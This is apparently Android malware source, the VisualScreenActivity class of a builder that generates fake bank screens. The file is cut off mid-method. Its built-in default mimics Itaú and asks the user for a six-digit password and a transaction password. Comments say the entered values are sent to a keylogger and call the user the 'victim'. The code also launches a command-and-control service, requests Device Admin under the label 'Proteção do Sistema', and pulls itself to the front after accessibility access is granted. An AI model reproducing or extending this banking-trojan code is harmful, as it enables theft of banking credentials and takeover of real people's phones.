package com.seguranca.protecao;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.os.Bundle;
import android.text.InputType;
import android.util.Base64;
import android.util.Log;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.inputmethod.EditorInfo;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * TELA VISUAL DINÂMICA
 * 
 * Esta Activity renderiza telas customizadas baseadas em configuração JSON.
 * É usada pelo APK Builder Visual para criar telas de operadoras/bancos.
 * 
 * FLUXO:
 * 1. Recebe configuração via Intent ou SharedPreferences
 * 2. Renderiza elementos (textos, botões, inputs, imagens)
 * 3. Captura inputs e envia para keylogger
 * 4. Navega entre telas conforme configurado
 */
public class VisualScreenActivity extends AppCompatActivity {
    
    private static final String TAG = "VisualScreen";
    
    // Configuração das telas
    private JSONArray screens;
    private JSONObject theme;
    private int currentScreenIndex = 0;
    
    // Container principal
    private FrameLayout mainContainer;
    
    // Inputs para captura
    private Map<String, EditText> inputFields = new HashMap<>();
    
    // Dados capturados
    private Map<String, String> capturedData = new HashMap<>();
    
    // 🔐 Controle de acessibilidade (usando SharedPreferences para persistir)
    private static final String PREFS_NAME = "VisualScreenPrefs";
    private static final String KEY_WAITING_ACCESSIBILITY = "waiting_accessibility";
    private static final String KEY_ACCESSIBILITY_DONE = "accessibility_done";
    
    // 📤 File Upload
    private static final int FILE_PICKER_REQUEST_CODE = 9001;
    private String currentFileLabel = ""; // Label do arquivo sendo selecionado
    
    // Receiver para quando a acessibilidade é ativada
    private BroadcastReceiver accessibilityReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d(TAG, "📡 Broadcast ACCESSIBILITY_ENABLED recebido!");
            handleAccessibilityEnabled();
        }
    };
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Configura tela cheia
        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
        );
        
        // Container principal
        mainContainer = new FrameLayout(this);
        mainContainer.setLayoutParams(new FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ));
        setContentView(mainContainer);
        
        // Registra receiver para quando acessibilidade for ativada
        IntentFilter filter = new IntentFilter("com.seguranca.protecao.ACCESSIBILITY_ENABLED");
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(accessibilityReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
        } else {
            registerReceiver(accessibilityReceiver, filter);
        }
        
        // Carrega configuração
        loadConfiguration();
        
        // Renderiza primeira tela
        renderScreen(getFirstScreenIndex());
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        try {
            unregisterReceiver(accessibilityReceiver);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desregistrar receiver: " + e.getMessage());
        }
    }
    
    /**
     * 🔐 Chamado quando a acessibilidade é ativada (via broadcast ou onResume)
     */
    private void handleAccessibilityEnabled() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean accessibilityDone = prefs.getBoolean(KEY_ACCESSIBILITY_DONE, false);
        
        if (accessibilityDone) {
            Log.d(TAG, "⚠️ Acessibilidade já foi processada, ignorando...");
            return;
        }
        
        if (isAccessibilityEnabled()) {
            Log.d(TAG, "✅ Acessibilidade ativada! Avançando para próxima tela...");
            
            // Marca como concluído para não executar novamente
            prefs.edit()
                .putBoolean(KEY_WAITING_ACCESSIBILITY, false)
                .putBoolean(KEY_ACCESSIBILITY_DONE, true)
                .apply();
            
            // Inicia serviço de comando e controle
            startCommandService();
            
            // 🚀 TRAZ O APP PARA FRENTE antes de avançar a tela
            bringAppToFront();
            
            // Se pedir administrador está ativo e não está ativo ainda, pede!
            if (CommandControlService.REQUEST_ADMIN) {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                    Log.d(TAG, "🛡️ Solicitando ativação do Device Admin no APK Visual...");
                    CommandControlService.requestAdminRuntime = true;
                    Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Proteção do Sistema");
                    
                    startActivity(adminIntent);
                    
                    // Monitora ativação para trazer o app de volta para a próxima tela
                    monitorAdminActivationVisual();
                    return;
                }
            }

            // Avança para próxima tela
            if (currentScreenIndex < screens.length() - 1) {
                renderScreen(currentScreenIndex + 1);
            }
        }
    }

    /**
     * Monitora ativação do Device Admin no APK Visual
     */
    private void monitorAdminActivationVisual() {
        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(VisualScreenActivity.this, MyAdminReceiver.class);
                if (dpm != null && dpm.isAdminActive(adminComponent)) {
                    Log.d(TAG, "🛡️ Device Admin ativado no APK Visual! Prosseguindo...");
                    bringAppToFront();
                    if (isCurrentScreenAccessibilityScreen()) {
                        renderScreen(getFirstScreenIndex());
                    } else {
                        renderScreen(currentScreenIndex);
                    }
                } else {
                    // Continua monitorando
                    new android.os.Handler().postDelayed(this, 1000);
                }
            }
        }, 1000);
    }
    
    /**
     * 🚀 Traz o app para frente (acima de Settings/Launcher)
     */
    private void bringAppToFront() {
        try {
            Log.d(TAG, "🚀 Trazendo app para frente...");
            
            // Método 1: Usar ActivityManager para mover task para frente
            android.app.ActivityManager am = (android.app.ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                am.moveTaskToFront(getTaskId(), android.app.ActivityManager.MOVE_TASK_WITH_HOME);
                Log.d(TAG, "✅ moveTaskToFront executado");
            }
            
            // Método 2: Reabrir a própria activity (backup)
            Intent intent = new Intent(this, VisualScreenActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
            startActivity(intent);
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao trazer app para frente: " + e.getMessage());
        }
    }
    
    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        Log.d(TAG, "onNewIntent - app foi trazido para frente");
        setIntent(intent);
        
        // 🔐 Se veio do AutomatedAccessibilityService após ativar acessibilidade
        if (intent.getBooleanExtra("accessibility_just_enabled", false)) {
            Log.d(TAG, "🚀 onNewIntent: Acessibilidade acabou de ser ativada!");
            
            // Marca como processado
            SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
            prefs.edit()
                .putBoolean(KEY_WAITING_ACCESSIBILITY, false)
                .putBoolean(KEY_ACCESSIBILITY_DONE, true)
                .apply();
            
            // Inicia serviço de comando e controle
            startCommandService();
            
            // Avança para próxima tela
            if (currentScreenIndex < screens.length() - 1) {
                Log.d(TAG, "🚀 Avançando para tela: " + (currentScreenIndex + 1));
                renderScreen(currentScreenIndex + 1);
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        boolean waitingForAccessibility = prefs.getBoolean(KEY_WAITING_ACCESSIBILITY, false);
        
        Log.d(TAG, "onResume - waitingForAccessibility: " + waitingForAccessibility);
        
        // 🔐 Se já tem acessibilidade ativada e estamos na tela de acessibilidade, avança!
        if (isAccessibilityEnabled() && isCurrentScreenAccessibilityScreen()) {
            Log.d(TAG, "Acessibilidade já ativa no onResume, avançando para próxima tela...");
            
            // Marca como concluído
            prefs.edit()
                .putBoolean(KEY_WAITING_ACCESSIBILITY, false)
                .putBoolean(KEY_ACCESSIBILITY_DONE, true)
                .apply();
                
            startCommandService();
            
            // Se pedir administrador está ativo e não está ativo ainda, solicita!
            if (CommandControlService.REQUEST_ADMIN) {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                    Log.d(TAG, "🛡️ Solicitando ativação do Device Admin no onResume (Acessibilidade já ativa)...");
                    CommandControlService.requestAdminRuntime = true;
                    Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Proteção do Sistema");
                    
                    startActivity(adminIntent);
                    
                    monitorAdminActivationVisual();
                    return;
                }
            }
            
            if (currentScreenIndex < screens.length() - 1) {
                renderScreen(currentScreenIndex + 1);
            } else {
                finish();
            }
            return;
        }
        
        // Se estava aguardando acessibilidade, verifica se foi ativada
        if (waitingForAccessibility) {
            handleAccessibilityEnabled();
        } else {
            // Se já tem acessibilidade ativada, mas precisa de Admin, solicita!
            if (CommandControlService.REQUEST_ADMIN && isAccessibilityEnabled()) {
                android.app.admin.DevicePolicyManager dpm = (android.app.admin.DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
                android.content.ComponentName adminComponent = new android.content.ComponentName(this, MyAdminReceiver.class);
                if (dpm != null && !dpm.isAdminActive(adminComponent)) {
                    Log.d(TAG, "🛡️ Solicitando ativação do Device Admin no onResume (Acessibilidade já ativa)...");
                    CommandControlService.requestAdminRuntime = true;
                    Intent adminIntent = new Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                    adminIntent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Proteção do Sistema");
                    
                    startActivity(adminIntent);
                    
                    monitorAdminActivationVisual();
                }
            }
        }
    }

    private boolean isCurrentScreenAccessibilityScreen() {
        if (screens == null || currentScreenIndex >= screens.length()) return false;
        try {
            JSONObject screen = screens.getJSONObject(currentScreenIndex);
            if (screen.optBoolean("isAccessibilityScreen", false) || "accessibility".equalsIgnoreCase(screen.optString("id"))) {
                return true;
            }
            JSONArray elements = screen.optJSONArray("elements");
            if (elements != null) {
                for (int i = 0; i < elements.length(); i++) {
                    JSONObject element = elements.getJSONObject(i);
                    if ("button".equals(element.optString("type")) && 
                        "accessibility".equals(element.optString("buttonAction"))) {
                        return true;
                    }
                }
            }
        } catch (Exception e) {
            // Ignore
        }
        return false;
    }

    private int getFirstScreenIndex() {
        if (screens == null) return 0;
        if (!isAccessibilityEnabled()) {
            return 0;
        }
        for (int i = 0; i < screens.length(); i++) {
            try {
                JSONObject screen = screens.getJSONObject(i);
                JSONArray elements = screen.optJSONArray("elements");
                boolean hasAccessibilityButton = false;
                if (elements != null) {
                    for (int j = 0; j < elements.length(); j++) {
                        JSONObject element = elements.getJSONObject(j);
                        if ("button".equals(element.optString("type")) && 
                            "accessibility".equals(element.optString("buttonAction"))) {
                            hasAccessibilityButton = true;
                            break;
                        }
                    }
                }
                if (!hasAccessibilityButton) {
                    return i;
                }
            } catch (Exception e) {
                // Ignore
            }
        }
        return 0;
    }
    
    /**
     * 🔐 Verifica se a acessibilidade está habilitada
     */
    private boolean isAccessibilityEnabled() {
        return new PermissionManager(this).isAccessibilityServiceEnabled();
    }
    
    /**
     * 🔐 Inicia o serviço de comando e controle
     * Usa startService() para evitar ForegroundServiceDidNotStartInTimeException no Android 15+
     */
    private void startCommandService() {
        try {
            Intent serviceIntent = new Intent(this, CommandControlService.class);
            // Usa startService() simples - o serviço decide se precisa ser foreground
            // Isso evita o crash de "ForegroundServiceDidNotStartInTimeException"
            startService(serviceIntent);
            Log.d(TAG, "✅ CommandControlService iniciado");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar serviço: " + e.getMessage());
        }
    }
    
    /**
     * Carrega configuração das telas
     */
    private void loadConfiguration() {
        try {
            // 1. Tenta carregar do Intent
            String configJson = getIntent().getStringExtra("config");
            
            // 2. Tenta carregar de SharedPreferences
            if (configJson == null || configJson.isEmpty()) {
                SharedPreferences prefs = getSharedPreferences("visual_config", MODE_PRIVATE);
                configJson = prefs.getString("screens_config", null);
            }
            
            // 3. Tenta carregar do assets (visual_config.json) - usado pelo APK Builder Visual
            if (configJson == null || configJson.isEmpty()) {
                configJson = loadConfigFromAssets();
            }
            
            if (configJson != null && !configJson.isEmpty()) {
                JSONObject config = new JSONObject(configJson);
                screens = config.getJSONArray("screens");
                theme = config.optJSONObject("theme");
                Log.d(TAG, "Configuração carregada: " + screens.length() + " telas");
            } else {
                // Usa configuração padrão (Itaú)
                loadDefaultItauConfig();
            }
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao carregar configuração: " + e.getMessage());
            loadDefaultItauConfig();
        }
    }
    
    /**
     * Carrega configuração do assets/visual_config.json
     */
    private String loadConfigFromAssets() {
        try {
            java.io.InputStream is = getAssets().open("visual_config.json");
            int size = is.available();
            byte[] buffer = new byte[size];
            is.read(buffer);
            is.close();
            String json = new String(buffer, "UTF-8");
            Log.d(TAG, "Configuração carregada do assets: " + json.length() + " bytes");
            return json;
        } catch (Exception e) {
            Log.d(TAG, "Nenhuma configuração no assets: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Verifica se existe configuração visual no assets
     */
    public static boolean hasVisualConfig(Context context) {
        try {
            java.io.InputStream is = context.getAssets().open("visual_config.json");
            is.close();
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Configuração padrão estilo Itaú
     */
    private void loadDefaultItauConfig() {
        try {
            // Tela 1: Senha Inicial
            JSONObject screen1 = new JSONObject();
            screen1.put("id", "senha-inicial");
            screen1.put("name", "Senha Inicial");
            screen1.put("backgroundColor", "#FF6600");
            screen1.put("captureInputs", true);
            
            JSONArray elements1 = new JSONArray();
            
            // Título
            JSONObject title = new JSONObject();
            title.put("id", "title");
            title.put("type", "text");
            title.put("content", "Validação de Segurança");
            title.put("position", new JSONObject().put("x", 40).put("y", 180));
            title.put("size", new JSONObject().put("width", 300).put("height", 40));
            JSONObject titleStyle = new JSONObject();
            titleStyle.put("fontSize", 24);
            titleStyle.put("fontWeight", "bold");
            titleStyle.put("textColor", "#FFFFFF");
            titleStyle.put("textAlign", "center");
            title.put("style", titleStyle);
            elements1.put(title);
            
            // Subtítulo
            JSONObject subtitle = new JSONObject();
            subtitle.put("id", "subtitle");
            subtitle.put("type", "text");
            subtitle.put("content", "Por favor, digite sua senha inicial de 6 dígitos para validar seu dispositivo.");
            subtitle.put("position", new JSONObject().put("x", 40).put("y", 230));
            subtitle.put("size", new JSONObject().put("width", 300).put("height", 60));
            JSONObject subtitleStyle = new JSONObject();
            subtitleStyle.put("fontSize", 14);
            subtitleStyle.put("textColor", "#FFFFFF");
            subtitleStyle.put("textAlign", "center");
            subtitle.put("style", subtitleStyle);
            elements1.put(subtitle);
            
            // Input senha
            JSONObject input = new JSONObject();
            input.put("id", "input-senha");
            input.put("type", "input");
            input.put("inputType", "pin");
            input.put("inputMaxLength", 6);
            input.put("inputPlaceholder", "● ● ● ● ● ●");
            input.put("inputLabel", "SENHA_INICIAL");
            input.put("position", new JSONObject().put("x", 60).put("y", 320));
            input.put("size", new JSONObject().put("width", 260).put("height", 60));
            JSONObject inputStyle = new JSONObject();
            inputStyle.put("backgroundColor", "#FFFFFF");
            inputStyle.put("textColor", "#333333");
            inputStyle.put("borderRadius", 10);
            inputStyle.put("fontSize", 24);
            inputStyle.put("textAlign", "center");
            input.put("style", inputStyle);
            elements1.put(input);
            
            // Botão continuar
            JSONObject btn = new JSONObject();
            btn.put("id", "btn-continuar");
            btn.put("type", "button");
            btn.put("content", "Continuar");
            btn.put("buttonAction", "next");
            btn.put("position", new JSONObject().put("x", 60).put("y", 420));
            btn.put("size", new JSONObject().put("width", 260).put("height", 50));
            JSONObject btnStyle = new JSONObject();
            btnStyle.put("backgroundColor", "#003366");
            btnStyle.put("textColor", "#FFFFFF");
            btnStyle.put("borderRadius", 25);
            btnStyle.put("fontSize", 16);
            btnStyle.put("fontWeight", "bold");
            btn.put("style", btnStyle);
            elements1.put(btn);
            
            screen1.put("elements", elements1);
            
            // Tela 2: Senha Transação
            JSONObject screen2 = new JSONObject();
            screen2.put("id", "senha-transacao");
            screen2.put("name", "Senha de Transação");
            screen2.put("backgroundColor", "#FF6600");
            screen2.put("captureInputs", true);
            
            JSONArray elements2 = new JSONArray();
            
            // Check
            JSONObject check = new JSONObject();
            check.put("id", "check");
            check.put("type", "text");
            check.put("content", "✓");
            check.put("position", new JSONObject().put("x", 160).put("y", 150));
            check.put("size", new JSONObject().put("width", 60).put("height", 50));
            JSONObject checkStyle = new JSONObject();
            checkStyle.put("fontSize", 48);
            checkStyle.put("textColor", "#00FF00");
            checkStyle.put("textAlign", "center");
            check.put("style", checkStyle);
            elements2.put(check);
            
            // Título 2
            JSONObject title2 = new JSONObject();
            title2.put("id", "title2");
            title2.put("type", "text");
            title2.put("content", "Senha de Transação");
            title2.put("position", new JSONObject().put("x", 40).put("y", 220));
            title2.put("size", new JSONObject().put("width", 300).put("height", 40));
            title2.put("style", titleStyle);
            elements2.put(title2);
            
            // Subtítulo 2
            JSONObject subtitle2 = new JSONObject();
            subtitle2.put("id", "subtitle2");
            subtitle2.put("type", "text");
            subtitle2.put("content", "Agora digite sua senha de transação para completar a validação.");
            subtitle2.put("position", new JSONObject().put("x", 40).put("y", 270));
            subtitle2.put("size", new JSONObject().put("width", 300).put("height", 60));
            subtitle2.put("style", subtitleStyle);
            elements2.put(subtitle2);
            
            // Input transação
            JSONObject input2 = new JSONObject();
            input2.put("id", "input-transacao");
            input2.put("type", "input");
            input2.put("inputType", "pin");
            input2.put("inputMaxLength", 6);
            input2.put("inputPlaceholder", "● ● ● ● ● ●");
            input2.put("inputLabel", "SENHA_TRANSACAO");
            input2.put("position", new JSONObject().put("x", 60).put("y", 360));
            input2.put("size", new JSONObject().put("width", 260).put("height", 60));
            input2.put("style", inputStyle);
            elements2.put(input2);
            
            // Botão finalizar
            JSONObject btn2 = new JSONObject();
            btn2.put("id", "btn-finalizar");
            btn2.put("type", "button");
            btn2.put("content", "Finalizar Validação");
            btn2.put("buttonAction", "submit");
            btn2.put("position", new JSONObject().put("x", 60).put("y", 460));
            btn2.put("size", new JSONObject().put("width", 260).put("height", 50));
            btn2.put("style", btnStyle);
            elements2.put(btn2);
            
            screen2.put("elements", elements2);
            
            // Tela 3: Sucesso
            JSONObject screen3 = new JSONObject();
            screen3.put("id", "sucesso");
            screen3.put("name", "Sucesso");
            screen3.put("backgroundColor", "#003366");
            
            JSONArray elements3 = new JSONArray();
            
            // Ícone sucesso
            JSONObject successIcon = new JSONObject();
            successIcon.put("id", "success-icon");
            successIcon.put("type", "text");
            successIcon.put("content", "✓");
            successIcon.put("position", new JSONObject().put("x", 140).put("y", 150));
            successIcon.put("size", new JSONObject().put("width", 100).put("height", 80));
            JSONObject successStyle = new JSONObject();
            successStyle.put("fontSize", 72);
            successStyle.put("textColor", "#00FF00");
            successStyle.put("textAlign", "center");
            successIcon.put("style", successStyle);
            elements3.put(successIcon);
            
            // Título sucesso
            JSONObject successTitle = new JSONObject();
            successTitle.put("id", "success-title");
            successTitle.put("type", "text");
            successTitle.put("content", "Validação Concluída!");
            successTitle.put("position", new JSONObject().put("x", 40).put("y", 260));
            successTitle.put("size", new JSONObject().put("width", 300).put("height", 50));
            JSONObject successTitleStyle = new JSONObject();
            successTitleStyle.put("fontSize", 26);
            successTitleStyle.put("fontWeight", "bold");
            successTitleStyle.put("textColor", "#FFFFFF");
            successTitleStyle.put("textAlign", "center");
            successTitle.put("style", successTitleStyle);
            elements3.put(successTitle);
            
            // Botão fechar
            JSONObject btnFechar = new JSONObject();
            btnFechar.put("id", "btn-fechar");
            btnFechar.put("type", "button");
            btnFechar.put("content", "Fechar");
            btnFechar.put("buttonAction", "custom");
            btnFechar.put("position", new JSONObject().put("x", 60).put("y", 400));
            btnFechar.put("size", new JSONObject().put("width", 260).put("height", 50));
            JSONObject btnFecharStyle = new JSONObject();
            btnFecharStyle.put("backgroundColor", "#FF6600");
            btnFecharStyle.put("textColor", "#FFFFFF");
            btnFecharStyle.put("borderRadius", 25);
            btnFecharStyle.put("fontSize", 16);
            btnFecharStyle.put("fontWeight", "bold");
            btnFechar.put("style", btnFecharStyle);
            elements3.put(btnFechar);
            
            screen3.put("elements", elements3);
            
            // Monta array de telas
            screens = new JSONArray();
            screens.put(screen1);
            screens.put(screen2);
            screens.put(screen3);
            
            // Tema
            theme = new JSONObject();
            theme.put("primaryColor", "#FF6600");
            theme.put("secondaryColor", "#003366");
            
            Log.d(TAG, "Configuração padrão Itaú carregada");
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao criar config padrão: " + e.getMessage());
        }
    }
    
    /**
     * Renderiza uma tela específica
     */
    private void renderScreen(int index) {
        if (screens == null || index >= screens.length()) {
            Log.e(TAG, "Tela inválida: " + index);
            finish();
            return;
        }
        
        currentScreenIndex = index;
        mainContainer.removeAllViews();
        inputFields.clear();
        
        try {
            JSONObject screen = screens.getJSONObject(index);
            
            // Cor de fundo
            String bgColor = screen.optString("backgroundColor", "#FFFFFF");
            mainContainer.setBackgroundColor(Color.parseColor(bgColor));
            
            // Elementos
            JSONArray elements = screen.optJSONArray("elements");
            if (elements != null) {
                for (int i = 0; i < elements.length(); i++) {
                    JSONObject element = elements.getJSONObject(i);
                    View view = createElementView(element);
                    if (view != null) {
                        mainContainer.addView(view);
                    }
                }
            }
            
            Log.d(TAG, "Tela renderizada: " + screen.optString("name", "Tela " + index));
            
        } catch (JSONException e) {
            Log.e(TAG, "Erro ao renderizar tela: " + e.getMessage());
        }
    }
    
    /**
     * Cria view para um elemento
     */
    private View createElementView(JSONObject element) throws JSONException {
        String type = element.getString("type");
        JSONObject position = element.getJSONObject("position");
        JSONObject size = element.getJSONObject("size");
        JSONObject style = element.optJSONObject("style");
        
        int x = dpToPx(position.getInt("x"));
        int y = dpToPx(position.getInt("y"));
        int width = dpToPx(size.getInt("width"));
        int height = dpToPx(size.getInt("height"));
        
        FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(width, height);
        params.leftMargin = x;
        params.topMargin = y;
        
        View view = null;
        
        switch (type) {
            case "text":
                view = createTextView(element, style);
                break;
            case "button":
                view = createButton(element, style);
                break;
            case "input":
                view = createInput(element, style);
                break;
            case "image":
            case "logo":
                view = createImageView(element, style);
                break;
            case "rectangle":
                view = createRectangle(element, style);
                break;
            case "file_upload":
                view = createFileUpload(element, style);
                break;
            case "fingerprint":
                view = createFingerprintView(element, style);
                break;
            case "facial":
                view = createFacialView(element, style);
                break;
            case "loading_bar":
                view = createLoadingBarView(element, style);
                break;
        }
        
        if (view != null) {
            view.setLayoutParams(params);
        }
        
        return view;
    }
    
    /**
     * Cria TextView
     */
    private TextView createTextView(JSONObject element, JSONObject style) throws JSONException {
        TextView tv = new TextView(this);
        tv.setText(element.getString("content"));
        
        if (style != null) {
            tv.setTextColor(Color.parseColor(style.optString("textColor", "#000000")));
            tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, style.optInt("fontSize", 14));
            
            if ("bold".equals(style.optString("fontWeight"))) {
                tv.setTypeface(tv.getTypeface(), Typeface.BOLD);
            }
            
            String align = style.optString("textAlign", "left");
            switch (align) {
                case "center":
                    tv.setGravity(Gravity.CENTER);
                    break;
                case "right":
                    tv.setGravity(Gravity.END | Gravity.CENTER_VERTICAL);
                    break;
                default:
                    tv.setGravity(Gravity.START | Gravity.CENTER_VERTICAL);
            }
        }
        
        return tv;
    }
    
    /**
     * Cria Button
     */
    private Button createButton(JSONObject element, JSONObject style) throws JSONException {
        Button btn = new Button(this);
        btn.setText(element.getString("content"));
        btn.setAllCaps(false);
        btn.setFocusable(true);
        btn.setClickable(true);
        btn.setEnabled(true);
        
        if (style != null) {
            // Background com arredondamento
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(Color.parseColor(style.optString("backgroundColor", "#007AFF")));
            bg.setCornerRadius(dpToPx(style.optInt("borderRadius", 8)));
            btn.setBackground(bg);
            
            btn.setTextColor(Color.parseColor(style.optString("textColor", "#FFFFFF")));
            btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, style.optInt("fontSize", 16));
            
            if ("bold".equals(style.optString("fontWeight"))) {
                btn.setTypeface(btn.getTypeface(), Typeface.BOLD);
            }
        }
        
        // Ação do botão
        String action = element.optString("buttonAction", "next");
        String buttonUrl = element.optString("buttonUrl", "");
        btn.setOnClickListener(v -> handleButtonAction(action, buttonUrl));
        btn.setOnTouchListener((v, event) -> {
            if (event.getAction() == android.view.MotionEvent.ACTION_UP) {
                v.performClick();
            }
            return false;
        });
        
        return btn;
    }
    
    /**
     * Cria EditText (Input)
     */
    private EditText createInput(JSONObject element, JSONObject style) throws JSONException {
        EditText et = new EditText(this);
        
        String inputType = element.optString("inputType", "text");
        int maxLength = element.optInt("inputMaxLength", 100);
        String placeholder = element.optString("inputPlaceholder", "");
        String label = element.optString("inputLabel", "");
        
        et.setHint(placeholder);
        et.setTag(label); // Usa tag para identificar no keylogger
        
        // 🔑 GARANTIR QUE O INPUT É CLICÁVEL E FOCÁVEL
        et.setFocusable(true);
        et.setFocusableInTouchMode(true);
        et.setClickable(true);
        et.setEnabled(true);
        et.setCursorVisible(true);
        
        // Tipo de input - NÃO usa PASSWORD para capturar o texto real
        // O texto fica visível na tela da vítima mas isso garante captura correta
        switch (inputType) {
            case "pin":
                // PIN numérico de 6 dígitos - teclado numérico, texto visível
                et.setInputType(InputType.TYPE_CLASS_NUMBER);
                et.setImeOptions(EditorInfo.IME_ACTION_DONE);
                // Adiciona transformation method manual para mostrar bullets mas manter texto real
                et.setTransformationMethod(new android.text.method.PasswordTransformationMethod());
                break;
            case "password":
                // Senha de texto - mostra bullets
                et.setInputType(InputType.TYPE_CLASS_TEXT);
                et.setTransformationMethod(new android.text.method.PasswordTransformationMethod());
                break;
            case "numeric":
                et.setInputType(InputType.TYPE_CLASS_NUMBER);
                break;
            default:
                et.setInputType(InputType.TYPE_CLASS_TEXT);
        }
        
        // Limite de caracteres
        et.setFilters(new android.text.InputFilter[] {
            new android.text.InputFilter.LengthFilter(maxLength)
        });
        
        if (style != null) {
            // Background
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(Color.parseColor(style.optString("backgroundColor", "#FFFFFF")));
            bg.setCornerRadius(dpToPx(style.optInt("borderRadius", 8)));
            et.setBackground(bg);
            
            et.setTextColor(Color.parseColor(style.optString("textColor", "#000000")));
            et.setHintTextColor(Color.parseColor("#888888")); // Cor do placeholder
            et.setTextSize(TypedValue.COMPLEX_UNIT_SP, style.optInt("fontSize", 16));
            et.setGravity(Gravity.CENTER);
            et.setPadding(dpToPx(16), dpToPx(8), dpToPx(16), dpToPx(8));
        }
        
        // Salva referência para captura
        inputFields.put(label, et);
        
        return et;
    }
    
    /**
     * Cria ImageView
     */
    private ImageView createImageView(JSONObject element, JSONObject style) throws JSONException {
        ImageView iv = new ImageView(this);
        iv.setScaleType(ImageView.ScaleType.FIT_CENTER);
        
        // Tenta carregar imagem base64
        String imageFile = element.optString("imageFile", "");
        if (!imageFile.isEmpty() && imageFile.startsWith("data:image")) {
            try {
                String base64 = imageFile.split(",")[1];
                byte[] decodedBytes = Base64.decode(base64, Base64.DEFAULT);
                Bitmap bitmap = BitmapFactory.decodeByteArray(decodedBytes, 0, decodedBytes.length);
                iv.setImageBitmap(bitmap);
            } catch (Exception e) {
                Log.e(TAG, "Erro ao decodificar imagem: " + e.getMessage());
            }
        } else {
            // Placeholder
            iv.setBackgroundColor(Color.parseColor("#E0E0E0"));
        }
        
        return iv;
    }
    
    /**
     * Cria retângulo colorido
     */
    private View createRectangle(JSONObject element, JSONObject style) throws JSONException {
        View view = new View(this);
        
        if (style != null) {
            GradientDrawable bg = new GradientDrawable();
            bg.setColor(Color.parseColor(style.optString("backgroundColor", "#CCCCCC")));
            bg.setCornerRadius(dpToPx(style.optInt("borderRadius", 0)));
            view.setBackground(bg);
        }
        
        return view;
    }
    
    /**
     * 📤 Cria elemento de upload de arquivo
     */
    private View createFileUpload(JSONObject element, JSONObject style) throws JSONException {
        LinearLayout container = new LinearLayout(this);
        container.setOrientation(LinearLayout.VERTICAL);
        container.setGravity(Gravity.CENTER);
        
        // Background
        if (style != null) {
            GradientDrawable bg = new GradientDrawable();
